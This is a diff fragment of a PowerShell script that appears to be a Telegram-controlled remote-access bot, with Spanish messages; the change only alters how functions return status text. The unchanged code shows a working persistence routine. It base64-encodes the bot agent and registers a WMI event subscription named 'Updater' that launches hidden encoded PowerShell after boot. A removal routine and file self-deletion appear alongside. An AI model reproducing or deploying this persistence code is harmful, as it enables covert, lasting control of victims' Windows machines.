@@ -176,21 +176,21 @@ Remove-Item $ruta_ps1 ; sleep -Seconds 5 ; Remove-Item $ruta
 
 function persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
-{write-host "Sorry, necesitas privilegios"; break }  else {
+{$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
 $agent_bot = create_agent
 $code =[system.convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($agent_bot))
 Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};$Consumer=Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate="$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -win hidden -enc $code";RunInteractively='false'};Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null
-write-host "Persistencia ejecutada correctamente"}
+$texto = write-host "Persistencia ejecutada correctamente"; return $texto}
 }
 
 function remove-persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
-{write-host "Sorry, necesitas privilegios"; break }  
+{$texto = write-host "Sorry, necesitas privilegios";return $texto; break }  
 else {
 $comando = (Get-WmiObject commandlineeventconsumer -Namespace root\subscription -Filter "name='UPDATER'").CommandLineTemplate
-if ($comando -eq $null -or $comando -eq "") {Write-Host Todo correcto! parece estar limpio el arranque.} else {
-Write-Host Estas hackeado!!! Encontrado hack en su arranque: `n`n$comando`n Eliminando persistencia
-Get-WmiObject commandlineeventconsumer -Namespace root\subscription -Filter "name='Updater'" | Remove-WmiObject
+if ($comando -eq $null -or $comando -eq "") {$texto = Write-Host "Todo correcto! parece estar limpio el arranque"; return $texto} else {
+$texto = Write-Host "Eliminando persistencia"
+Get-WmiObject commandlineeventconsumer -Namespace root\subscription -Filter "name='Updater'" | Remove-WmiObject; return $texto
 }}}
 
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
